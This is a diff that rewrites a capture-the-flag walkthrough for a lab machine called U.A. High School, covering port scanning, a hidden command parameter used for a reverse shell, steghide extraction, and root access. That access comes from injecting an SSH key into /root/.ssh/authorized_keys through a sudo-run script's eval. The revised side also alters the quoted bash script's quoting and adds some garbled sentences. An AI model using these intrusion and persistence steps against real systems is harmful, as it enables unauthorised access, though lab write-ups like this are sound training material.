@@ -4,7 +4,7 @@
 
 {{header("Enumeration", "enumeration")}}
 
-{{text("We start with scanning through the ports.")}}
+{{text("We start by scanning the target for open ports.")}}
 
 {{console("nmap -T5 -p- -sV -sC 10.10.123.111", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-19 12:47 CET
 Warning: 10.10.123.111 giving up on port because retransmission cap hit (2).
@@ -22,21 +22,23 @@ PORT   STATE    SERVICE     VERSION
 |_http-title: U.A. High School
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel")}}
 
-{{text("We find two ports open.")}}
+{{text("The scan reveals two open ports: ")}}
 
 {{list(['22 (SSH)', '80 (HTTP)'])}}
 
-{{text("Let us proceed with checking the website.")}}
+{{header("Shell as www-data", "shell-as-www-data")}}
 
-{{image("../../static/images/cheesectf/000002.jpg")}}
+{{text("Next, we proceed to examine the website hosted on port 80.")}}
 
-{{text("While looking at the source code, we can notice a <code class='bg-gray-300 rounded-md px-1'>/assets</code> directory.")}}
+{{image("../../static/images/uahighschool/000002.jpg")}}
 
-{{text("Visiting <code class='bg-gray-300 rounded-md px-1'>/assets</code> directory gives us a blank page, which is weird.")}}
+{{text("Inspecting the source code reveals a <code class='bg-gray-300 rounded-md px-1'>/assets</code> directory.")}}
 
-{{text("We are also forbidden from going to <code class='bg-gray-300 rounded-md px-1'>/assets/images</code>, which means there probably is something hidden in the <code class='bg-gray-300 rounded-md px-1'>/assets</code> directory.")}}
+{{text("Navigating to <code class='bg-gray-300 rounded-md px-1'>/assets</code> displays a blank page, which seems unusual.")}}
 
-{{text("I use a directory scanning tool in order to uncover any hidden files.")}}
+{{text("Access to <code class='bg-gray-300 rounded-md px-1'>/assets/images</code> is forbidden.")}}
+
+{{text("I used a directory-scanning tool to uncover any hidden directories.")}}
 
 {{console("gobuster dir -u http://10.10.123.111/assets/ -w /usr/share/wordlists/dirb/common.txt", "===============================================================
 Gobuster v3.6
@@ -62,44 +64,44 @@ Progress: 4614 / 4615 (99.98%)
 Finished
 ===============================================================")}}
 
-{{text("We find a <code class='bg-gray-300 rounded-md px-1'>/index.php</code> file.")}}
+{{text("This reveals an <code class='bg-gray-300 rounded-md px-1'>/index.php</code> file.")}}
 
-{{text("It's also competely empty. I couldn't find anything else, so I started trying out different parameters in the URL and one of them worked.")}}
+{{text("Although the file is empty, trying out different parameters in the URL eventually yields a result.")}}
 
-{{image("../../static/images/cheesectf/000003.jpg")}}
+{{image("../../static/images/uahighschool/000003.jpg")}}
 
-{{text("It seems like we can pass arguments to the <code class='bg-gray-300 rounded-md px-1'>cmd</code> parameter and we get back base64 encoded output.")}}
+{{text("It appears that the <code class='bg-gray-300 rounded-md px-1'>cmd</code> parameter can accept arguments, returning base64-encoded output.")}}
 
-{{text("Let's try to get a reverse shell.")}}
+{{text("Let's try and attempt to get a reverse shell.")}}
 
-{{text("I used this command from <code class='bg-gray-300 rounded-md px-1'>revshells.com</code>. Don't forget to URL encode your payload.")}}
+{{text("I use the following command from <code class='bg-gray-300 rounded-md px-1'>revshells.com</code>. Remember to URL encode your payload.")}}
 
-{{image("../../static/images/cheesectf/000004.jpg")}}
+{{image("../../static/images/uahighschool/000004.jpg")}}
 
-{{text("Passing it as the command to our parameter, we get back a reverse shell.")}}
+{{text("Passing the encoded payload as a parameter provides us with a reverse shell.")}}
 
-{{image("../../static/images/cheesectf/000005.jpg")}}
+{{image("../../static/images/uahighschool/000005.jpg")}}
 
-{{text("I found a password inside the <code class='bg-gray-300 rounded-md px-1'>/var/www/Hidden_Conent</code> directory, but had no idea where to use it.")}}
+{{header("Shell as deku", "shell-as-deku")}}
+
+{{text("There was a file containing a password in <code class='bg-gray-300 rounded-md px-1'>/var/www/Hidden_Content</code> directory, but its we don't know what is it for.")}}
 
 {{console("cat passphrase.txt | base64 -d", "AllmightForEver!!!")}}
 
-{{text("I continued looking through the system, and found a unused image in the <code class='bg-gray-300 rounded-md px-1'>/var/www/html/assets/images</code> directory.")}}
+{{text("Further exploration leads to an unused image file in the <code class='bg-gray-300 rounded-md px-1'>/var/www/html/assets/images</code> directory.")}}
 
-{{text("I was pretty sure the password I found was for extracting hidden files using <code class='bg-gray-300 rounded-md px-1'>steghide</code>.")}}
+{{text("I suspected the password might be for extracting hidden content using <code class='bg-gray-300 rounded-md px-1'>steghide</code>.")}}
 
-{{text("Next, I downloaded the image by running <code class='bg-gray-300 rounded-md px-1'>wget 10.10.123.111/assets/images/oneforall.jpg</code>.")}}
+{{text("I Downloaded the image using <code class='bg-gray-300 rounded-md px-1'>wget 10.10.123.111/assets/images/oneforall.jpg</code>.")}}
 
-{{text("Now I tried extracting the hidden files with the found password.")}}
+{{text("Then, I attempted to extract hidden content with the password.")}}
 
 {{console("steghide extract -sf oneforall.jpg", "Enter passphrase: 
-steghide: the file format of the file "oneforall.jpg" is not supported.")}}
+steghide: the file format of the file 'oneforall.jpg' is not supported.")}}
 
-{{text("For some reason it doesn't work.")}}
+{{text("The extraction failed because the file is of a wrong format.")}}
 
-{{text("We also can't open the image, which is weird.")}}
-
-{{text("Let's look at the hex dump of this file.")}}
+{{text("Viewing the file's hex dump reveals its <code class='bg-gray-300 rounded-md px-1'>PNG</code> signature.")}}
 
 {{console("xxd oneforall.jpg | head", "00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
 00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
@@ -108,26 +110,17 @@ steghide: the file format of the file "oneforall.jpg" is not supported.")}}
 00000040: 1b23 1c16 1620 2c20 2326 2729 2a29 191f  .#... , #&')*)..
 00000050: 2d30 2d28 3025 2829 28ff db00 4301 0707  -0-(0%()(...C...
 00000060: 070a 080a 130a 0a13 281a 161a 2828 2828  ........(...((((
-00000070: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
-00000080: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
+00000070: 2828 2828 2828 2828 2828 2828 2828 2828  (((((((((((((((( 
+00000080: 2828 2828 2828 2828 2828 2828 2828 2828  (((((((((((((((( 
 00000090: 2828 2828 2828 2828 2828 2828 2828 ffc0  ((((((((((((((..")}}
 
-{{text("By looking at the hex dump of this file, we see that it is a <code class='bg-gray-300 rounded-md px-1'>PNG</code> file, and steghide doesn't work on that.")}}
+{{text("Changing the file signature to <code class='bg-gray-300 rounded-md px-1'>JPG</code> allows <code class='bg-gray-300 rounded-md px-1'>steghide</code> to extract the hidden content.")}}
 
-{{text("We probably have to change bytes from the <code class='bg-gray-300 rounded-md px-1'>PNG</code> file signature to <code class='bg-gray-300 rounded-md px-1'>JPG</code>.")}}
+{{text("This reveals credentials to log in via <code class='bg-gray-300 rounded-md px-1'>SSH</code>.")}}
 
-{{image("../../static/images/cheesectf/000006.jpg")}}
+{{header("Shell as root", "shell-as-root")}}
 
-{{text("Let's try to use <code class='bg-gray-300 rounded-md px-1'>steghide</code> once again.")}}
-
-{{console("steghide extract -sf oneforall.jpg", "Enter passphrase: 
-wrote extracted data to "creds.txt".")}}
-
-{{text("We extract user credentials which we can use to log in via <code class='bg-gray-300 rounded-md px-1'>SSH</code>.")}}
-
-{{header}}
-
-{{text("We check <code class='bg-gray-300 rounded-md px-1'>sudo permissions</code> of our user.")}}
+{{text("I checked <code class='bg-gray-300 rounded-md px-1'>sudo</code> permissions for the user.")}}
 
 {{console("sudo -l", "[sudo] password for deku: 
 Matching Defaults entries for deku on myheroacademia:
@@ -142,24 +135,24 @@ User deku may run the following commands on myheroacademia:
 
 {{console("cat feedback.sh", "#!/bin/bash
 
-echo "Hello, Welcome to the Report Form       "
-echo "This is a way to report various problems"
-echo "    Developed by                        "
-echo "        The Technical Department of U.A."
+echo 'Hello, Welcome to the Report Form       '
+echo 'This is a way to report various problems'
+echo '    Developed by                        '
+echo '        The Technical Department of U.A.'
 
-echo "Enter your feedback:"
+echo 'Enter your feedback:'
 read feedback
 
+if [[ '$feedback' != *'\'* && '$feedback' != *')'* && '$feedback' != *'$('* && '$feedback' != *'|'* && '$feedback' != *'&'* && '$feedback' != *';'* && '$feedback' != *'?'* && '$feedback' != *'!'* && '$feedback' != *'\\'* ]]; then
+    echo 'It is This:'
+    eval 'echo $feedback'
 
-if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
-    echo "It is This:"
-    eval "echo $feedback"
-
-    echo "$feedback" >> /var/log/feedback.txt
-    echo "Feedback successfully saved."
+    echo '$feedback' >> /var/log/feedback.txt
+    echo 'Feedback successfully saved.'
 else
-    echo "Invalid input. Please provide a valid input." 
-fi")}}
+    echo 'Invalid input. Please provide a valid input.' 
+fi
+")}}
 
 {{text("It echoes any input we provide, if it doesn't contain any of the blacklisted symbols. We can notice that the <code class='bg-gray-300 rounded-md px-1'>></code> symbol is permitted, meaning we can use it to write to files.")}}
 
@@ -167,14 +160,14 @@ fi")}}
 
 {{console("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILO60uNhTUNMEDTfn5f+qZZDXWg1JcMGtypKRMyIxnn6 kali@kali >> /root/.ssh/authorized_keys")}}
 
-{{image("../../static/images/cheesectf/000007.jpg")}}
+{{image("../../static/images/uahighschool/000007.jpg")}}
 
 {{text("We now can log in as root by providing our <code class='bg-gray-300 rounded-md px-1'>id_rsa</code> key.")}}
 
 {{console("ssh root@10.10.123.111 -i id_rsa")}}
 
-{{text("We find the flag in <code class='bg-gray-300 rounded-md px-1'>/root</code>")}}
+{{text("We are able to find the flag in <code class='bg-gray-300 rounded-md px-1'>/root</code>.")}}
 
-{{image("../../static/images/cheesectf/000008.jpg")}}
+{{image("../../static/images/uahighschool/000008.jpg")}}
 
-
+{{script()}}
